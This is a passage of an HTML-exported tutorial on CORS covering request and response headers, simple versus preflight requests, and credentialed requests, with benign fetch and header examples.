href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80bd-a320-d6ae9e34a032" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Request-Method: POST
+</code></pre></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-800e-b95d-d7850a875717" class="bulleted-list"><li style="list-style-type:disc">Used in preflight requests</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8028-82da-db45f304ce40" class="bulleted-list"><li style="list-style-type:disc">Indicates the HTTP method of the actual request</li></ul></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-804b-b780-d2b5f3cb0f6c" class=""><strong>Access-Control-Request-Headers</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80a8-b059-d3e45a217343" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Request-Headers: X-Custom-Header, Content-Type
+</code></pre></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80b0-9227-f71195a18868" class="bulleted-list"><li style="list-style-type:disc">Used in preflight requests</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-809c-ba33-ef9a5210d2cc" class="bulleted-list"><li style="list-style-type:disc">Lists custom headers that will be sent</li></ul></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-80a0-8df6-d66ec681b799" class=""><strong>Response Headers (Sent by Server)</strong></h3></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8072-866d-eb4b59210cbc" class=""><strong>Access-Control-Allow-Origin</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-803d-a0c1-ce4bcf18fc50" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Allow-Origin: https://example.com
+</code></pre></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-804b-813f-cac074c290f8" class="bulleted-list"><li style="list-style-type:disc"><strong>Most important CORS header</strong></li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8097-8813-f570d51ef698" class="bulleted-list"><li style="list-style-type:disc">Specifies which origin(s) can access the resource</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8080-a9b7-e7dbc843d62b" class="bulleted-list"><li style="list-style-type:disc">Can be a specific origin or  (wildcard)</li></ul></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8050-afe1-f318431ecc04" class=""><strong>Examples:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8093-b991-c9443a988717" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># Allow specific origin
+Access-Control-Allow-Origin: https://example.com
+
+# Allow any origin (dangerous with credentials)
+Access-Control-Allow-Origin: *
+
+# Multiple origins (NOT directly supported)
+# Must use server-side logic to set dynamically
+</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80e7-8c47-d59073349703" class=""><strong>Important:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-807f-aabd-fb343417aa90" class="bulleted-list"><li style="list-style-type:disc">Cannot use multiple origins directly</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80d3-b502-f844bf000207" class="bulleted-list"><li style="list-style-type:disc">Must check Origin header and set dynamically</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80d8-b678-f22b5eda8f4a" class="bulleted-list"><li style="list-style-type:disc">Wildcard () cannot be used with credentials</li></ul></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-80d4-bff3-e2f981e72cbf" class=""><strong>Access-Control-Allow-Methods</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8096-bbb2-d7d45991e14e" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Allow-Methods: GET, POST, PUT, DELETE
+</code></pre></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80f3-95b2-ed1c544621eb" class="bulleted-list"><li style="list-style-type:disc">Specifies which HTTP methods are allowed</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80dd-859f-ec6fa90511e3" class="bulleted-list"><li style="list-style-type:disc">Used in preflight responses</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80b8-a193-ff62ea4c1ae1" class="bulleted-list"><li style="list-style-type:disc">Comma-separated list</li></ul></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8035-9167-f0e272930305" class=""><strong>Access-Control-Allow-Headers</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8067-a3bb-de99e2f18e84" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Allow-Headers: Content-Type, X-Custom-Header, Authorization
+</code></pre></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8067-883d-fcab7f5da9ef" class="bulleted-list"><li style="list-style-type:disc">Specifies which request headers are allowed</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80bf-b82a-fb876f623c87" class="bulleted-list"><li style="list-style-type:disc">Used in preflight responses</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80df-9ed1-c768e7e3e186" class="bulleted-list"><li style="list-style-type:disc">Comma-separated list</li></ul></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-80c5-a276-d3ea16bb8152" class=""><strong>Access-Control-Allow-Credentials</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8062-ad9d-c44a1672bfee" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Allow-Credentials: true
+</code></pre></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80a8-b601-c8658e94b1ab" class="bulleted-list"><li style="list-style-type:disc">Indicates whether credentials (cookies, auth headers) can be sent</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8052-9a6c-ccab217affbd" class="bulleted-list"><li style="list-style-type:disc">Must be <code>true</code> or omitted (defaults to false)</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-802c-9267-cdc6c72d6b7c" class="bulleted-list"><li style="list-style-type:disc"><strong>Cannot use wildcard () with credentials</strong></li></ul></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-80ec-8e84-d9f4f1a33898" class=""><strong>Access-Control-Expose-Headers</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80ef-be19-e5de1aa996b7" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Expose-Headers: X-Custom-Header, X-Another-Header
+</code></pre></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80ad-ad9c-ffeb1ff083af" class="bulleted-list"><li style="list-style-type:disc">Specifies which response headers can be accessed by JavaScript</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8012-b820-d96078b5f503" class="bulleted-list"><li style="list-style-type:disc">By default, only simple headers are exposed</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80f9-acf8-f63efccd0f7f" class="bulleted-list"><li style="list-style-type:disc">Comma-separated list</li></ul></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8050-a814-ea002710b105" class=""><strong>Access-Control-Max-Age</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80eb-b82b-d10132cb78ef" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Max-Age: 86400
+</code></pre></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80db-a9c5-e7d9ff342071" class="bulleted-list"><li style="list-style-type:disc">Specifies how long preflight results can be cached (in seconds)</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80b3-bdf7-d8626317edd4" class="bulleted-list"><li style="list-style-type:disc">Reduces number of preflight requests</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8043-a51e-d49f9ad0b0c9" class="bulleted-list"><li style="list-style-type:disc">Default is 0 (no caching)</li></ul></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-809e-b92f-f51ba5091eea"/></div><div style="display:contents" dir="auto"><h2 id="2b4562ad-76f0-8081-aa6e-f47bf9261b64" class=""><strong>Simple vs Preflight Requests</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8019-aed0-d07dd508c753" class=""><strong>Simple Requests</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80c7-8860-eaf032993dc4" class=""><strong>Criteria for Simple Request:</strong></p></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-80b3-a787-f3cb53305ad4" class="numbered-list" start="1"><li>Method: GET, POST, or HEAD</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-8036-81c1-ca417a221175" class="numbered-list" start="2"><li>Headers: Only simple headers allowed:<div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-805d-a23e-eef0472f156c" class="bulleted-list"><li style="list-style-type:disc">Accept</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80d5-9cdf-c043f4332a02" class="bulleted-list"><li style="list-style-type:disc">Accept-Language</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80f4-8dcf-d0f81287a8d6" class="bulleted-list"><li style="list-style-type:disc">Content-Language</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80c4-a1ee-fd3a6ef109cb" class="bulleted-list"><li style="list-style-type:disc">Content-Type (with restrictions)</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-800b-bf8a-dd5febb12d90" class="numbered-list" start="3"><li>Content-Type restrictions:<div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-807a-8c1f-f21b4fe2b507" class="bulleted-list"><li style="list-style-type:disc"><code>application/x-www-form-urlencoded</code></li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8018-805a-de2e6a26dfa7" class="bulleted-list"><li style="list-style-type:disc"><code>multipart/form-data</code></li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8058-a248-fea557c4362a" class="bulleted-list"><li style="list-style-type:disc"><code>text/plain</code></li></ul></div></li></ol></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-805c-87bd-db856216f564" class=""><strong>Example Simple Request:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8056-8900-f3766ebe2ad7" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Simple GET requestfetch(&#x27;https://api.example.com/data&#x27;)
+  .then(response =&gt; response.json());
+
+// Simple POST requestfetch(&#x27;https://api.example.com/data&#x27;, {
+  method: &#x27;POST&#x27;,
+  headers: {
+    &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;
+  },
+  body: &#x27;key=value&#x27;
+});
+</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80e0-8d33-d581f1bbb304" class=""><strong>Flow:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8077-b0a6-c36f588e149c" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">1. Browser sends request directly
+2. Server responds with CORS headers
+3. Browser checks CORS headers
+4. Request proceeds or is blocked
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-80c9-ac19-d3681599f16e" class=""><strong>Preflight Requests</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8024-8e9c-db4873d86bf3" class=""><strong>When Preflight is Triggered:</strong></p></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-8063-b78c-f7b4e598d2fd" class="numbered-list" start="1"><li>Custom headers (e.g., <code>X-Custom-Header</code>)</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-808d-8040-c15ebcc00415" class="numbered-list" start="2"><li>Non-simple methods (PUT, DELETE, PATCH)</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-8026-94bc-e87aa68f191c" class="numbered-list" start="3"><li>Content-Type other than simple types (e.g., <code>application/json</code>)</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-80c9-9995-e699e1a66c13" class="numbered-list" start="4"><li>Requests with credentials (if server requires preflight)</li></ol></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80b7-897b-c958717dbd90" class=""><strong>Example Preflight Request:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80ef-b2e0-d2aacea4fed2" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// This triggers preflightfetch(&#x27;https://api.example.com/data&#x27;, {
+  method: &#x27;PUT&#x27;,
+  headers: {
+    &#x27;Content-Type&#x27;: &#x27;application/json&#x27;,
+    &#x27;X-Custom-Header&#x27;: &#x27;value&#x27;
+  },
+  body: JSON.stringify({key: &#x27;value&#x27;})
+});
+</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8074-9c9e-e2afee2474b2" class=""><strong>Preflight Flow:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80e7-a00b-ef8b43ba2ee8" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">1. Browser sends OPTIONS request (preflight)
+   OPTIONS /api/data HTTP/1.1
+   Origin: https://example.com
+   Access-Control-Request-Method: PUT
+   Access-Control-Request-Headers: Content-Type, X-Custom-Header
+
+2. Server responds to preflight
+   HTTP/1.1 200 OK
+   Access-Control-Allow-Origin: https://example.com
+   Access-Control-Allow-Methods: PUT
+   Access-Control-Allow-Headers: Content-Type, X-Custom-Header
+   Access-Control-Max-Age: 86400
+
+3. Browser checks preflight response
+   - If allowed → Sends actual request
+   - If not allowed → Blocks request
+
+4. Actual request is sent (if preflight passed)
+   PUT /api/data HTTP/1.1
+   Origin: https://example.com
+   Content-Type: application/json
+   X-Custom-Header: value
+</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8035-9d44-f5335669918c" class=""><strong>Important:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-807b-b7be-db440a3eee7c" class="bulleted-list"><li style="list-style-type:disc">Preflight requests are <strong>automatic</strong> (browser handles them)</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8012-802f-c5fc89e44932" class="bulleted-list"><li style="list-style-type:disc">You don&#x27;t need to manually send OPTIONS requests</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8098-992c-cce44c405dff" class="bulleted-list"><li style="list-style-type:disc">Preflight is a <strong>browser optimization</strong> to avoid sending unsafe requests</li></ul></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-80db-b1c9-d3850ed76ddf"/></div><div style="display:contents" dir="auto"><h2 id="2b4562ad-76f0-80a7-a941-c6f1975a92b8" class=""><strong>CORS with Credentials</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8046-a85c-c3db06454162" class=""><strong>What are Credentials?</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80ac-be19-c8c2cdfa11ac" class="">Credentials include:</p></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8006-a252-f7253014bfbb" class="bulleted-list"><li style="list-style-type:disc">Cookies</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8055-97ac-df9522148555" class="bulleted-list"><li style="list-style-type:disc">HTTP Authentication</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8044-afd9-cf2e3baeb715" class="bulleted-list"><li style="list-style-type:disc">Client certificates</li></ul></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-80b5-ba14-feec913b84fd" class=""><strong>Enabling Credentials</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80e3-bad3-f4f0b2fe3a61" class=""><strong>Client-side (JavaScript):</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80fe-be7c-d17e23b5a8c3" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">fetch(&#x27;https://api.example.com/data&#x27;, {
+  credentials: &#x27;include&#x27;// or &#x27;same-origin&#x27;, &#x27;omit&#x27;
+});
+</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-800e-8870-ec324d24a55a" class=""><strong>Server-side (Response headers):</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80c7-b957-c583156b6ec2" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Allow-Origin: https://example.com
+Access-Control-Allow-Credentials: true
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8056-8926-d99a63231053" class=""><strong>Critical Rule: No Wildcard with Credentials</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80f7-a490-d571cf5b11ca" class=""><strong>❌ INVALID (Browsers will reject):</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80f2-a132-c0fbb01e4a31" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8012-bda5-d75121708a7f" class=""><strong>✅ VALID:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80b3-b0e5-c68a54344556" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Allow-Origin: https://example.com
+Access-Control-Allow-Credentials: true
